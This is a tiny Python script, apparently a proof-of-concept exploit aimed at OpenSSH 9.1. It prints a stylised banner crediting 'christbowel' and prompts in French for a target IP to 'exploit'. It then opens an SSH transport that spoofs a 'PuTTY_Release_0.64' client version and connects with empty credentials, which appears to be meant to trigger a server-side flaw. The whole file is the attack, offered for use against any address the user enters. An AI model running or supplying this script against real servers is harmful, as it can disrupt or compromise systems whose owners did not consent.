

import paramiko
import pyfiglet

ascii_text = pyfiglet.figlet_format("openssh 9.1", font="starwars")                                                   
ascii_text += "\n\033[38;2;255;153;51m\033[2m✨💥by christbowel🎭💻\033[0m"
print(ascii_text)

print ("")

target_ip = input("Entrer l'adresse ip a exploiter: ")
CLIENT_ID = "PuTTY_Release_0.64"

def main():
     transport = paramiko.Transport(target_ip)
     transport.local_version = f"SSH-2.0-{CLIENT_ID}"
     transport.connect(username='', password='')

if __name__ == "__main__":
     main()